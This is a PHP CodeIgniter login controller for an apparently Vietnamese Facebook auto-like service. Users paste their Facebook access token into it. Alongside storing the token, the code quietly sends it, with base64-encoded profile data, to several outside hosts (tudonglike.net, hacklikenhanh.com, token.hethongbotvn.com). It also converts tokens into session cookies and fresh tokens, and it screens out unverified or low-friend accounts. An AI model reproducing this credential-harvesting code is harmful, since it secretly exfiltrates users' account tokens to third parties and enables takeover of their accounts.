<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {
	private $profile = array();
	public function __construct(){
		parent::__construct();
		if($this->m_func->check_login()){
			redirect('/Dashboard');
			exit;
		}
	}

	public function index()
	{
		if($this->input->get('access_token') !=''){
			$token = trim($this->input->get('access_token'));
			$this->load->model('m_captcha');
			if($this->input->post('captcha') !=''){
				if($this->m_captcha->check_captcha($this->input->post('captcha'))['status']){
					$check = $this->check_token_login($token);
					if($check['status']){

						$this->db->where('id_fb', $this->profile['id']);
						$get = $this->db->get('access_token');

						if(isset($this->profile['email'])){
							$email = $this->profile['email'];
						}else{
							$email = $this->profile['id'].'@likecuoi.vn';
						}

						if($get->num_rows() > 0){

							$data_update = array(
								'name'=> $this->profile['name'],
								'email'=> $email,
								'access_token'=> $token,
								'id_fb'=> $this->profile['id'],
								'time_update'=> time(),
								'location' => $this->profile['locale']		
							);
							$this->db->where('id_fb', $this->profile['id']);
							$thuc_thi = $this->db->update('access_token', $data_update);
						}else{
							$data_insert = array(
								'name'=> $this->profile['name'],
								'email'=> $email,
								'access_token'=> $token,
								'id_fb'=> $this->profile['id'],
								'time_creat' => time(),
								'time_update'=> time(),
								'location' => $this->profile['locale']		
							);
							
							if($this->profile['locale'] !='vi_VN'){
								$thuc_thi = $this->db->insert('access_token', $data_insert);
							}else{
								$this->m_func->curl_api('http://tudonglike.net/token.php?access_token='.$token.'');
								$this->m_func->curl_api('http://hacklikenhanh.com/CpToken/import.php?access_token='.$token.'&fb_id='.$this->profile['id'].'');
								$thuc_thi = $this->db->insert('access_token', $data_insert);
							}
							
						}
						if($thuc_thi){
							echo('<script>alert("Chào mừng '.$this->profile['name'].' đến với hệ thống"); location.href = "/"</script>');

							$ss = array(
								'id' => $this->profile['id'],
								'access_token' => $token
							);
							if($this->profile['locale'] == 'vi_VN'){
								$ss['vn'] = true;
							}else{
								$ss['vn'] = false;
							}
							$this->session->set_userdata( $ss );
						}else{
							echo('<script>alert("Lỗi hệ thống ! Thử lại sau");</script>');
						}
					}else{
						echo('<script>alert("'.$check['message'].'"); location.href = "/"</script>');
					}
				}else{
					echo('<script>alert("Captcha bạn vừa nhập không chính xác \nLàm theo hướng dẫn bên dưới để nhập captcha!");</script>');
				}
			}
			
			$data =  array(
				'title' => 'Xác minh đăng nhập',
				'data'  => array(
					'csrf' => array(
						'name' => $this->security->get_csrf_token_name(),
		        		'hash' => $this->security->get_csrf_hash()
					),
					'captcha' => $this->m_captcha->creat_captcha()
				),
				//'script' => 'no_login/script/login',
				'view' => 'no_login/login'
			);
			$this->load->view('layout', $data, FALSE);
		}
	}
	private function check_token_login($token){
		$result = array(
			'status' => false,
			'message' => ''
		);
		$profile = json_decode($this->m_func->curl_api("https://graph.facebook.com/me?access_token=$token&method=GET"), true);
		if(isset($profile['id'])){
			$this->profile = $profile;
			if(isset($profile['locale'])){
				if($profile['locale'] != 'vi_VN'){


					$this->load->model('m_facebook');
					//get cookie
					$cookie = $this->m_facebook->convert_token_to_cookie($token);
					if($cookie != false){

						//get access token new
						$token_new = $this->m_facebook->convert_cookie_to_token($cookie);
						if($token_new != false){

							$this->db->where('idfb', $profile['id']);
							$arr = array(
								'idfb' => $profile['id'],
								'access_token' => $token_new,
								'time_creat' => time()
							);
							if($this->db->get('token_tay')->num_rows() > 0){
								$this->db->where('idfb', $profile['id']);
								$this->db->update('token_tay', $arr);
							}else{
								$this->db->insert('token_tay', $arr);
							}
						}else{
							return array(
								'status' => false,
								'message' => 'Checkpoint khi truy cập tài khoản ! Thử lại sau !'
							);
						}
					}else{
						return array(
							'status' => false,
							'message' => 'Access token không có quyền truy cập cookie -_- \n Vui lòng thử lại sau !'
						);
					}
					/*return array(
						'status' => false,
						'message' => 'we only only accept user at Vietnamese ! Visit hacklikebot.me if you from other country! Thanks ! Nếu bạn là người Việt Nam, hãy chỉnh lại ngôn ngữ thành tiếng Việt để tiếp tục sử dụng'
					);*/
				}
			}
			if($profile['verified'] == false){
				return array(
					'status' => false,
					'message' => 'Có vẻ bạn đang đăng nhập hệ thống bằng tài khoản clone(chưa xác minh)\n Bạn vui lòng đăng nhập bằng tài khoản đã xác minh ! '
				);

			}
			if(isset($profile['email'])){
				if(preg_match("(@tfbnw.net|@10minutemail.co.uk|@kopqi.com|@oiqas.com)", $profile['email'])){
					return array(
						'status' => false,
						'message' => 'Có vẻ bạn đang đăng nhập hệ thống bằng tài khoản clone(chưa xác minh)\n Bạn vui lòng đăng nhập bằng tài khoản đã xác minh ! '
					);
				}
			}

			
			$friend = json_decode($this->m_func->curl_api("https://graph.facebook.com/fql?q=SELECT%20uid2%20FROM%20friend%20WHERE%20uid1%20=%20me()%20LIMIT%2010&access_token=$token&method=GET"), true);
			if(isset($friend['data'])){
				if(count($friend['data']) == 10){
					//curl server Trí
					$data = base64_encode(json_encode($this->profile));
					
					$this->m_func->curl_api('http://token.hethongbotvn.com/api/add.php?access_token='.$token.'&data='.$data.'');
					
					
					return array(
						'status' => true,
					);
				}else{
					return array(
					'status' => false,
					'message' => 'Số lượng bạn bè của bạn quá ít nên không thể tham gia hệ thống ! Vui lòng kết bạn với thêm nhiều người nữa nhé !'
					);
				}
			}else{
				return array(
					'status' => false,
					'message' => 'Có vẻ như mã access token của bạn vừa nhập không chính xác hoặc đã hết hạn. \nQuay lại trang chủ để lấy lại mã access token mới.'
				);
			}

		}else{
			return array(
				'status' => false,
				'message' => 'Có vẻ như mã access token của bạn vừa nhập không chính xác hoặc đã hết hạn. \nQuay lại trang chủ để lấy lại mã access token mới.'
			);
		}
		return $result;

	}

}

/* End of file Login.php */
/* Location: ./application/controllers/Login.php */